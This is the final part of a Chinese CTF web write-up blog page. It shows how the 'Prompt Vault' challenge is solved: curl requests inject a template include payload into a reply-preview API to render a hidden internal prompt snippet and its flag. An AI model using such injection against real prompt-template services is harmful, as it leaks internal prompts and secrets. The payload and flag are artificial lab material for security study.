+</span></span></span><span class="line"><span class="cl">  -d <span class="s1">&#39;{&#34;user_input&#34;:&#34;{{ include_prompt(\&#34;greeting\&#34;) }}&#34;}&#39;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>返回的是普通客服文案，没有 flag。因此题目中提到的内部片段没有出现在公开列表中。</p>
+<h2 class="heading-element" id="发现隐藏接口"><span>发现隐藏接口</span>
+  <a href="#%e5%8f%91%e7%8e%b0%e9%9a%90%e8%97%8f%e6%8e%a5%e5%8f%a3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>继续尝试常见 API 路径，发现 <code>/api/help</code>：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s http://36.213.142.162:27379/api/help</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>返回：</p>
+<json-viewer value="&#34;{\r\n  \&#34;about\&#34;: \&#34;ReplyKit previews CX reply drafts. Public snippets in /api/promptlets. Refund/SLA/compliance drafts use the internal review_gate snippet.\&#34;,\r\n  \&#34;ok\&#34;: true,\r\n  \&#34;syntax\&#34;: \&#34;{{ include_prompt(\\\&#34;name\\\&#34;) }}\&#34;\r\n}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>这里泄露了内部片段名：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">review_gate</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>虽然该片段没有出现在 <code>/api/promptlets</code> 中，但接口说明里直接提到了它。</p>
+<h2 class="heading-element" id="渲染内部片段"><span>渲染内部片段</span>
+  <a href="#%e6%b8%b2%e6%9f%93%e5%86%85%e9%83%a8%e7%89%87%e6%ae%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>既然已经知道内部片段名，就可以直接构造模板语法：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">{{ include_prompt(&#34;review_gate&#34;) }}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>提交给预览接口：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s -X POST http://36.213.142.162:27379/api/preview <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H <span class="s1">&#39;Content-Type: application/json&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s1">&#39;{&#34;user_input&#34;:&#34;{{ include_prompt(\&#34;review_gate\&#34;) }}&#34;}&#39;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>返回：</p>
+<json-viewer value="&#34;{\r\n  \&#34;final_preview\&#34;: \&#34;[Preview]\\n[INTERNAL USE ONLY]\\nCompliance checkpoint\\nAuth code: flag{1jsm9bdc49nc031udk4j7jq5tis5iibn}\\nRequires supervisor approval.\\n---\\n[/Preview]\&#34;,\r\n  \&#34;success\&#34;: true\r\n}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>内部片段被成功渲染，flag 出现在 <code>final_preview</code> 中。</p>
+<h2 class="heading-element" id="一行命令提取-flag"><span>一行命令提取 Flag</span>
+  <a href="#%e4%b8%80%e8%a1%8c%e5%91%bd%e4%bb%a4%e6%8f%90%e5%8f%96-flag" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s -X POST http://36.213.142.162:27379/api/preview <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H <span class="s1">&#39;Content-Type: application/json&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s1">&#39;{&#34;user_input&#34;:&#34;{{ include_prompt(\&#34;review_gate\&#34;) }}&#34;}&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="p">|</span> grep -o <span class="s1">&#39;flag{[^}]*}&#39;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>Flag</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">flag{1jsm9bdc49nc031udk4j7jq5tis5iibn}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h1 class="heading-element" id="chamber"><span>Chamber</span>
+  <a href="#chamber" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h1 class="heading-element" id="poichain"><span>PoiChain</span>
+  <a href="#poichain" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>剩下两道未解题，非常可惜。下次可以尝试网页版，有时候解题效果比 Agent 还好一些</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/ctf/" class="post-footer-tag-link" title="Tags - CTF">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>CTF</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/ai-cybersecurity-challenge-2026-web-writeup/" data-title="AI X Cybersecurity Challenge 2026 Web Writeup" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="CTF"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/ai-cybersecurity-challenge-2026-web-writeup/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/ai-cybersecurity-challenge-2026-web-writeup/" data-title="AI X Cybersecurity Challenge 2026 Web Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025-web-writeup/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">羊城杯 2025 Web Writeup</div>
+          </div>
+        </a><div></div></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#info2exploit">Info2Exploit</a>
+      <ul>
+        <li><a href="#信息收集">信息收集</a></li>
+        <li><a href="#端点枚举">端点枚举</a>
+          <ul>
+            <li><a href="#隐藏文档发现">隐藏文档发现</a></li>
+            <li><a href="#线索关键词收集">线索关键词收集</a></li>
+          </ul>
+        </li>
+        <li><a href="#漏洞分析">漏洞分析</a>
+          <ul>
+            <li><a href="#waf-绕过双重-url-编码">WAF 绕过：双重 URL 编码</a></li>
+            <li><a href="#scope-check存储范围限制">Scope Check：存储范围限制</a></li>
+          </ul>
+        </li>
+        <li><a href="#路径发现逐层关键词试探">路径发现：逐层关键词试探</a>
+          <ul>
+            <li><a href="#第一层目录--试探-private">第一层目录 —— 试探 <code>../private</code></a></li>
+            <li><a href="#第二层目录--在-private-下试探隐藏目录">第二层目录 —— 在 <code>../private/</code> 下试探隐藏目录</a></li>
+            <li><a href="#读取目标文件">读取目标文件</a></li>
+            <li><a href="#额外发现分号参数注入">额外发现：分号参数注入</a></li>
+          </ul>
+        </li>
+        <li><a href="#漏洞利用">漏洞利用</a>
+          <ul>
+            <li><a href="#payload">Payload</a></li>
+            <li><a href="#请求处理流程">请求处理流程</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#picklejail">PickleJail</a>
+      <ul>
+        <li><a href="#源码审计">源码审计</a>
+          <ul>
+            <li><a href="#路径穿越获取源码">路径穿越获取源码</a></li>
+            <li><a href="#认证模块-userspy">认证模块 (Users.py)</a></li>
+            <li><a href="#waf-wafpy">WAF (waf.py)</a></li>
+          </ul>
+        </li>
+        <li><a href="#认证绕过">认证绕过</a>
+          <ul>
+            <li><a href="#bcrypt-null-byte-截断">bcrypt Null-Byte 截断</a></li>
+          </ul>
+        </li>
+        <li><a href="#代码执行绕过-60b-waf">代码执行（绕过 60B WAF）</a>
+          <ul>
+            <li><a href="#py-文件导入法">.py 文件导入法</a></li>
+            <li><a href="#waf-子串绕过">WAF 子串绕过</a></li>
+            <li><a href="#模块名长度约束">模块名长度约束</a></li>
+            <li><a href="#追加模式突破-34-字符限制">追加模式突破 34 字符限制</a></li>
+          </ul>
+        </li>
+        <li><a href="#信息收集-1">信息收集</a>
+          <ul>
+            <li><a href="#环境信息">环境信息</a></li>
+            <li><a href="#flag-文件">/flag 文件</a></li>
+            <li><a href="#suid-二进制">SUID 二进制</a></li>
+            <li><a href="#cron-任务">Cron 任务</a></li>
+          </ul>
+        </li>
+        <li><a href="#提权">提权</a>
+          <ul>
+            <li><a href="#sudo--l">sudo -l</a></li>
+            <li><a href="#构造恶意脚本">构造恶意脚本</a></li>
+            <li><a href="#cron-执行">Cron 执行</a></li>
+            <li><a href="#读取-flag">读取 Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploit">Exploit</a></li>
+        <li><a href="#攻击链总结">攻击链总结</a></li>
+      </ul>
+    </li>
+    <li><a href="#malcraft">MalCraft</a>
+      <ul>
+        <li><a href="#初始侦察">初始侦察</a>
+          <ul>
+            <li><a href="#端点枚举-1">端点枚举</a></li>
+            <li><a href="#上传防护测试">上传防护测试</a></li>
+            <li><a href="#downloadphp-路径穿越测试">download.php 路径穿越测试</a></li>
+          </ul>
+        </li>
+        <li><a href="#源码审计-1">源码审计</a>
+          <ul>
+            <li><a href="#check_extension--扩展名校验">check_extension() — 扩展名校验</a></li>
+            <li><a href="#ai_security_check--ai-内容检测">ai_security_check() — AI 内容检测</a></li>
+            <li><a href="#downloadphp--文件下载">download.php — 文件下载</a></li>
+            <li><a href="#apache-配置">Apache 配置</a></li>
+          </ul>
+        </li>
+        <li><a href="#上传绕过">上传绕过</a>
+          <ul>
+            <li><a href="#htaccess-上传">.htaccess 上传</a></li>
+            <li><a href="#webshell-上传">webshell 上传</a></li>
+            <li><a href="#rce-验证">RCE 验证</a></li>
+          </ul>
+        </li>
+        <li><a href="#后渗透枚举">后渗透枚举</a>
+          <ul>
+            <li><a href="#db_backupconf">db_backup.conf</a></li>
+            <li><a href="#hash_record">.hash_record</a></li>
+          </ul>
+        </li>
+        <li><a href="#解密日志备份">解密日志备份</a></li>
+        <li><a href="#证据提取">证据提取</a></li>
+        <li><a href="#攻击链">攻击链</a></li>
+      </ul>
+    </li>
+    <li><a href="#prompt-vault">Prompt Vault</a>
+      <ul>
+        <li><a href="#题目信息">题目信息</a></li>
+        <li><a href="#页面分析">页面分析</a></li>
+        <li><a href="#枚举公开片段">枚举公开片段</a></li>
+        <li><a href="#发现隐藏接口">发现隐藏接口</a></li>
+        <li><a href="#渲染内部片段">渲染内部片段</a></li>
+        <li><a href="#一行命令提取-flag">一行命令提取 Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#chamber">Chamber</a></li>
+    <li><a href="#poichain">PoiChain</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/json-viewer-element/json-viewer-element.umd.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/8f09fd209f20fa2e312a55690ff44909.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
